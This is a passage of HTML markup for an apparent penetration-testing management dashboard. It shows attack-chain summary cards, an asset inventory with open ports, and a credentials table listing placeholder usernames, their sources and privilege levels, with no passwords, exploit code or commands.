                                    
                                    <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--danger);">6</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Findings</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--text-accent);">4</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Screenshots</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--warning);">5</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Steps</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">FIND-001</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-003</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-007</span>
                                        <span class="tag" style="font-size: 0.75rem;">+3 more</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Last updated: 2 hours ago</div>
                                        <div style="display: flex; gap: 0.5rem;">
                                            <button class="table-btn" onclick="editAttackChain('CHAIN-001')" title="Edit"></button>
                                            <button class="table-btn" onclick="cloneAttackChain('CHAIN-001')" title="Clone"></button>
                                            <button class="table-btn" onclick="exportChain('CHAIN-001')" title="Export"></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Attack Chain Card 2 -->
                            <div class="chain-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="chain-header" style="background: linear-gradient(135deg, var(--warning), #d97706); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Web Application Takeover</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">XSS  Session Hijacking  Admin Access</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">High</span>
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Web App</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Chain Summary:</div>
                                        <div style="font-size: 0.875rem; line-height: 1.4;">Starting with a reflected XSS vulnerability in the search function, an attacker can craft malicious payloads to steal session cookies from administrators...</div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--warning);">3</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Findings</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--text-accent);">7</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Screenshots</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--warning);">3</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Steps</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">FIND-004</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-008</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-012</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Status: In Review</div>
                                        <div style="display: flex; gap: 0.5rem;">
                                            <button class="table-btn" onclick="editAttackChain('CHAIN-002')" title="Edit"></button>
                                            <button class="table-btn" onclick="cloneAttackChain('CHAIN-002')" title="Clone"></button>
                                            <button class="table-btn" onclick="exportChain('CHAIN-002')" title="Export"></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Attack Chain Card 3 -->
                            <div class="chain-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="chain-header" style="background: linear-gradient(135deg, var(--text-accent), #3b82f6); color: white; padding: 1rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Privilege Escalation Path</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Local Admin  System  Domain Access</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Medium</span>
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Internal</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Chain Summary:</div>
                                        <div style="font-size: 0.875rem; line-height: 1.4;">Through misconfigured service permissions and unpatched Windows vulnerabilities, local administrator access can be escalated to SYSTEM level...</div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--text-accent);">4</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Findings</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--text-accent);">2</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Screenshots</div>
                                        </div>
                                        <div style="text-align: center;">
                                            <div style="font-weight: 600; color: var(--text-accent);">4</div>
                                            <div style="font-size: 0.75rem; color: var(--text-secondary);">Steps</div>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">FIND-009</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-011</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-015</span>
                                        <span class="tag" style="font-size: 0.75rem;">FIND-018</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Status: Complete</div>
                                        <div style="display: flex; gap: 0.5rem;">
                                            <button class="table-btn" onclick="editAttackChain('CHAIN-003')" title="Edit"></button>
                                            <button class="table-btn" onclick="cloneAttackChain('CHAIN-003')" title="Clone"></button>
                                            <button class="table-btn" onclick="exportChain('CHAIN-003')" title="Export"></button>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <!-- Draft Chain Card -->
                            <div class="chain-card" style="background: var(--bg-secondary); border-radius: 8px; border: 2px dashed var(--border); opacity: 0.7;">
                                <div style="padding: 2rem; text-align: center;">
                                    <div style="font-size: 2rem; margin-bottom: 1rem;"></div>
                                    <h3 style="margin-bottom: 0.5rem; color: var(--text-secondary);">Start New Attack Chain</h3>
                                    <p style="color: var(--text-secondary); margin-bottom: 1.5rem; font-size: 0.875rem;">Create a narrative linking multiple findings together</p>
                                    <button class="action-btn primary" onclick="openModal('newAttackChainModal')">+ New Chain</button>
                                </div>
                            </div>
                        </div>

                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="chainsBulkActions" style="display: none; margin-top: 1rem;">
                            <div class="bulk-info">
                                <span id="chainsSelectedCount">0</span> chains selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkExportChains()">Export Selected</button>
                                <button class="bulk-btn" onclick="bulkUpdateStatus()">Update Status</button>
                                <button class="bulk-btn danger" onclick="bulkDeleteChains()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="assets">
                    <div class="assets-container">
                        <!-- Assets Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">147</div>
                                    <div class="summary-label">Total Assets</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">23</div>
                                    <div class="summary-label">In Testing</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">89</div>
                                    <div class="summary-label">Completed</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">35</div>
                                    <div class="summary-label">Not Started</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportAssets()"> Export</button>
                                <button class="action-btn secondary" onclick="openModal('importAssetsModal')"> Import</button>
                                <button class="action-btn primary" onclick="openModal('addAssetModal')">+ Add Asset</button>
                            </div>
                        </div>
                        
                        <!-- Assets Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Asset Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterAssets('all')">All</button>
                                    <button class="filter-btn" onclick="filterAssets('host')"> Hosts</button>
                                    <button class="filter-btn" onclick="filterAssets('webapp')"> Web Apps</button>
                                    <button class="filter-btn" onclick="filterAssets('database')"> Databases</button>
                                    <button class="filter-btn" onclick="filterAssets('network')"> Network</button>
                                    <button class="filter-btn" onclick="filterAssets('cloud')"> Cloud</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterAssets('not-started')">Not Started</button>
                                    <button class="filter-btn" onclick="filterAssets('testing')">Testing</button>
                                    <button class="filter-btn" onclick="filterAssets('complete')">Complete</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Criticality:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterAssets('critical')">Critical</button>
                                    <button class="filter-btn" onclick="filterAssets('high')">High</button>
                                    <button class="filter-btn" onclick="filterAssets('medium')">Medium</button>
                                    <button class="filter-btn" onclick="filterAssets('low')">Low</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="assetSearch" placeholder="Search assets, IPs, hostnames..." onkeyup="searchAssets()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Assets Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="assetsTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortAssets('name')">Asset Name <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('type')">Type <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('ip')">IP/URL <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('os')">OS/Platform <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('owner')">Owner <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('criticality')">Criticality <span class="sort-arrow"></span></th>
                                        <th onclick="sortAssets('status')">Status <span class="sort-arrow"></span></th>
                                        <th>Findings</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <!-- Domain Controller -->
                                    <tr class="asset-row expandable-row" data-type="host" data-status="testing" data-criticality="critical" onclick="toggleAssetDetails(this)">
                                        <td><input type="checkbox" class="asset-checkbox" onclick="event.stopPropagation()"></td>
                                        <td><span class="expand-icon"></span><strong>DC01</strong></td>
                                        <td><span class="asset-type host"> Domain Controller</span></td>
                                        <td><code>192.168.1.10</code></td>
                                        <td>Windows Server 2019</td>
                                        <td>IT Operations</td>
                                        <td><span class="criticality critical">Critical</span></td>
                                        <td><span class="status testing">Testing</span></td>
                                        <td><span class="findings-count high">3</span></td>
                                        <td onclick="event.stopPropagation()">
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                    <tr class="services-row">
                                        <td colspan="10">
                                            <div class="services-content">
                                                <div class="services-title"> Discovered Services & Ports</div>
                                                <div class="services-grid">
                                                    <div class="service-item">
                                                        <div class="service-port">53/UDP</div>
                                                        <div class="service-name">DNS</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                    <div class="service-item">
                                                        <div class="service-port">88/TCP</div>
                                                        <div class="service-name">Kerberos</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                    <div class="service-item">
                                                        <div class="service-port">135/TCP</div>
                                                        <div class="service-name">RPC Endpoint Mapper</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                    <div class="service-item">
                                                        <div class="service-port">389/TCP</div>
                                                        <div class="service-name">LDAP</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                    <div class="service-item">
                                                        <div class="service-port">445/TCP</div>
                                                        <div class="service-name">SMB</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                    <div class="service-item">
                                                        <div class="service-port">3389/TCP</div>
                                                        <div class="service-name">RDP</div>
                                                        <div class="service-state open">Open</div>
                                                    </div>
                                                </div>
                                            </div>
                                        </td>
                                    </tr>
                                    
                                    <!-- Web Application -->
                                    <tr class="asset-row" data-type="webapp" data-status="complete" data-criticality="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Employee Portal</strong></td>
                                        <td><span class="asset-type webapp"> Web Application</span></td>
                                        <td><code>https://portal.acme.com</code></td>
                                        <td>ASP.NET Core</td>
                                        <td>HR Department</td>
                                        <td><span class="criticality high">High</span></td>
                                        <td><span class="status complete">Complete</span></td>
                                        <td><span class="findings-count medium">5</span></td>
                                        <td>
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                    
                                    <!-- Database Server -->
                                    <tr class="asset-row" data-type="database" data-status="not-started" data-criticality="critical">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>SQL-PROD-01</strong></td>
                                        <td><span class="asset-type database"> Database Server</span></td>
                                        <td><code>10.0.1.50</code></td>
                                        <td>SQL Server 2019</td>
                                        <td>Database Team</td>
                                        <td><span class="criticality critical">Critical</span></td>
                                        <td><span class="status not-started">Not Started</span></td>
                                        <td><span class="findings-count none">0</span></td>
                                        <td>
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                    
                                    <!-- Firewall -->
                                    <tr class="asset-row" data-type="network" data-status="complete" data-criticality="high">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Perimeter Firewall</strong></td>
                                        <td><span class="asset-type network"> Network Device</span></td>
                                        <td><code>203.0.113.1</code></td>
                                        <td>Cisco ASA 5505</td>
                                        <td>Network Team</td>
                                        <td><span class="criticality high">High</span></td>
                                        <td><span class="status complete">Complete</span></td>
                                        <td><span class="findings-count low">2</span></td>
                                        <td>
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                    
                                    <!-- Cloud Resource -->
                                    <tr class="asset-row" data-type="cloud" data-status="testing" data-criticality="medium">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>Azure AD Tenant</strong></td>
                                        <td><span class="asset-type cloud"> Cloud Service</span></td>
                                        <td><code>acmecorp.onmicrosoft.com</code></td>
                                        <td>Azure Active Directory</td>
                                        <td>Cloud Team</td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td><span class="status testing">Testing</span></td>
                                        <td><span class="findings-count medium">1</span></td>
                                        <td>
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                    
                                    <!-- File Server -->
                                    <tr class="asset-row" data-type="host" data-status="complete" data-criticality="medium">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>FILE-SRV-01</strong></td>
                                        <td><span class="asset-type host"> File Server</span></td>
                                        <td><code>192.168.1.25</code></td>
                                        <td>Windows Server 2016</td>
                                        <td>IT Operations</td>
                                        <td><span class="criticality medium">Medium</span></td>
                                        <td><span class="status complete">Complete</span></td>
                                        <td><span class="findings-count low">1</span></td>
                                        <td>
                                            <button class="table-btn" onclick="editAsset(this)" title="Edit"></button>
                                            <button class="table-btn" onclick="testAsset(this)" title="Test"></button>
                                            <button class="table-btn" onclick="viewFindings(this)" title="Findings"></button>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                        
                        <!-- Mobile Card View -->
                        <div class="assets-mobile-view">
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">DC01</div>
                                        <div class="asset-card-subtitle">192.168.1.10</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality critical">Critical</span>
                                        <span class="status testing">Testing</span>
                                        <span class="findings-count high">3</span>
                                    </div>
                                </div>
                                <div class="asset-card-details">
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Type</div>
                                        <div class="asset-card-detail-value"> Domain Controller</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Platform</div>
                                        <div class="asset-card-detail-value">Windows Server 2019</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Owner</div>
                                        <div class="asset-card-detail-value">IT Operations</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Key Services</div>
                                        <div class="asset-card-detail-value">DNS, LDAP, SMB, RDP</div>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                    <button class="table-btn"> Test</button>
                                    <button class="table-btn"> Findings</button>
                                </div>
                            </div>
                            
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">Employee Portal</div>
                                        <div class="asset-card-subtitle">https://portal.acme.com</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality high">High</span>
                                        <span class="status complete">Complete</span>
                                        <span class="findings-count medium">5</span>
                                    </div>
                                </div>
                                <div class="asset-card-details">
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Type</div>
                                        <div class="asset-card-detail-value"> Web Application</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Platform</div>
                                        <div class="asset-card-detail-value">ASP.NET Core</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Owner</div>
                                        <div class="asset-card-detail-value">HR Department</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Key Services</div>
                                        <div class="asset-card-detail-value">HTTPS, Authentication</div>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                    <button class="table-btn"> Test</button>
                                    <button class="table-btn"> Findings</button>
                                </div>
                            </div>
                            
                            <div class="asset-card">
                                <div class="asset-card-header">
                                    <div>
                                        <div class="asset-card-title">SQL-PROD-01</div>
                                        <div class="asset-card-subtitle">10.0.1.50</div>
                                    </div>
                                    <div class="asset-card-badges">
                                        <span class="criticality critical">Critical</span>
                                        <span class="status not-started">Not Started</span>
                                        <span class="findings-count none">0</span>
                                    </div>
                                </div>
                                <div class="asset-card-details">
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Type</div>
                                        <div class="asset-card-detail-value"> Database Server</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Platform</div>
                                        <div class="asset-card-detail-value">SQL Server 2019</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Owner</div>
                                        <div class="asset-card-detail-value">Database Team</div>
                                    </div>
                                    <div class="asset-card-detail">
                                        <div class="asset-card-detail-label">Key Services</div>
                                        <div class="asset-card-detail-value">SQL Server, RDP</div>
                                    </div>
                                </div>
                                <div class="asset-card-actions">
                                    <button class="table-btn"> Edit</button>
                                    <button class="table-btn"> Test</button>
                                    <button class="table-btn"> Findings</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Bulk Actions -->
                        <div class="bulk-actions" id="bulkActions" style="display: none;">
                            <div class="bulk-info">
                                <span id="selectedCount">0</span> assets selected
                            </div>
                            <div class="bulk-buttons">
                                <button class="bulk-btn" onclick="bulkMarkTesting()">Mark as Testing</button>
                                <button class="bulk-btn" onclick="bulkMarkComplete()">Mark as Complete</button>
                                <button class="bulk-btn" onclick="bulkSetCriticality()">Set Criticality</button>
                                <button class="bulk-btn danger" onclick="bulkDelete()">Delete Selected</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="screen-content" id="credentials">
                    <div class="assets-container">
                        <!-- Credentials Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">23</div>
                                    <div class="summary-label">Total Credentials</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">18</div>
                                    <div class="summary-label">Valid</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--danger);">3</div>
                                    <div class="summary-label">Admin Level</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">2</div>
                                    <div class="summary-label">Untested</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportCredentials()"> Export</button>
                                <button class="action-btn secondary" onclick="openModal('importCredsModal')"> Import</button>
                                <button class="action-btn primary" onclick="openModal('addCredentialModal')">+ Add Credential</button>
                            </div>
                        </div>
                        
                        <!-- Credentials Filters -->
                        <div class="assets-filters">
                            <div class="filter-section">
                                <label>Type:</label>
                                <div class="filter-group">
                                    <button class="filter-btn active" onclick="filterCredentials('all')">All</button>
                                    <button class="filter-btn" onclick="filterCredentials('user')"> User</button>
                                    <button class="filter-btn" onclick="filterCredentials('admin')"> Admin</button>
                                    <button class="filter-btn" onclick="filterCredentials('service')"> Service</button>
                                    <button class="filter-btn" onclick="filterCredentials('hash')"> Hashes</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Status:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterCredentials('valid')">Valid</button>
                                    <button class="filter-btn" onclick="filterCredentials('invalid')">Invalid</button>
                                    <button class="filter-btn" onclick="filterCredentials('untested')">Untested</button>
                                </div>
                            </div>
                            
                            <div class="filter-section">
                                <label>Source:</label>
                                <div class="filter-group">
                                    <button class="filter-btn" onclick="filterCredentials('client-provided')">Client</button>
                                    <button class="filter-btn" onclick="filterCredentials('password-spray')">Password Spray</button>
                                    <button class="filter-btn" onclick="filterCredentials('kerberoasting')">Kerberoasting</button>
                                </div>
                            </div>
                            
                            <div class="search-section">
                                <input type="text" class="search-input" id="credentialSearch" placeholder="Search usernames, targets, sources..." onkeyup="searchCredentials()">
                                <button class="search-btn"></button>
                            </div>
                        </div>
                        
                        <!-- Credentials Table -->
                        <div class="assets-table-container">
                            <table class="assets-table" id="credentialsTable">
                                <thead>
                                    <tr>
                                        <th><input type="checkbox" onchange="toggleSelectAll(this)"></th>
                                        <th onclick="sortCredentials('username')">Username <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('type')">Type <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('source')">Source <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('privilege')">Privilege <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('target')">Target <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('status')">Status <span class="sort-arrow"></span></th>
                                        <th onclick="sortCredentials('added')">Added <span class="sort-arrow"></span></th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="asset-row" data-type="user" data-source="password-spray" data-status="valid" data-privilege="domain-admin" style="border-left: 4px solid var(--danger);">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>ACMECORP\administrator</strong></td>
                                        <td><span class="asset-type user"> User Account</span></td>
                                        <td><span class="tag source">Password Spray</span></td>
                                        <td><span class="criticality critical">Domain Admin</span></td>
                                        <td>DC01</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>15/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="service" data-source="kerberoasting" data-status="valid" data-privilege="service">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>ACMECORP\svc_backup</strong></td>
                                        <td><span class="asset-type service"> Service Account</span></td>
                                        <td><span class="tag source">Kerberoasting</span></td>
                                        <td><span class="criticality high">Service</span></td>
                                        <td>Multiple systems</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>14/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="user" data-source="default" data-status="valid" data-privilege="admin">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>admin</strong></td>
                                        <td><span class="asset-type user"> User Account</span></td>
                                        <td><span class="tag source">Default</span></td>
                                        <td><span class="criticality high">Local Admin</span></td>
                                        <td>192.168.1.100 (Router)</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>13/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="user" data-source="smb-share" data-status="valid" data-privilege="user">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>ACMECORP\jdoe</strong></td>
                                        <td><span class="asset-type user"> User Account</span></td>
                                        <td><span class="tag source">SMB Share</span></td>
                                        <td><span class="criticality medium">Standard User</span></td>
                                        <td>Domain workstations</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>14/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="key" data-source="config-file" data-status="valid" data-privilege="root">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>root@server01.acmecorp.com</strong></td>
                                        <td><span class="asset-type key"> SSH Key</span></td>
                                        <td><span class="tag source">Config File</span></td>
                                        <td><span class="criticality critical">Root</span></td>
                                        <td>server01.acmecorp.com:22</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>13/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="database" data-source="config-file" data-status="valid" data-privilege="dba">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>sa</strong></td>
                                        <td><span class="asset-type database"> Database</span></td>
                                        <td><span class="tag source">Config File</span></td>
                                        <td><span class="criticality critical">DBA</span></td>
                                        <td>SQL01:1433</td>
                                        <td><span class="status completed">Valid</span></td>
                                        <td>12/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Test"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                    <tr class="asset-row" data-type="hash" data-source="domain-dump" data-status="cracked" data-privilege="user">
                                        <td><input type="checkbox" class="asset-checkbox"></td>
                                        <td><strong>ACMECORP\msmith</strong></td>
                                        <td><span class="asset-type hash"> Hash</span></td>
                                        <td><span class="tag source">Domain Dump</span></td>
                                        <td><span class="criticality medium">Standard User</span></td>
                                        <td>Domain systems</td>
                                        <td><span class="status testing">Cracked</span></td>
                                        <td>14/11/2024</td>
                                        <td>
                                            <button class="table-btn" onclick="testCredential(this)" title="Hash Only"></button>
                                            <button class="table-btn" onclick="copyCredential(this)" title="Copy"></button>
                                            <button class="table-btn" onclick="editCredential(this)" title="Edit"></button>
                                            <button class="table-btn danger" onclick="deleteCredential(this)" title="Delete"></button>
                                        </td>
                                    </tr>
                                
                                <!-- Client Provided -->
                                    <tr class="asset-row" data-type="user" data-source="client-provided" data-status="valid" data-privilege="test-account">
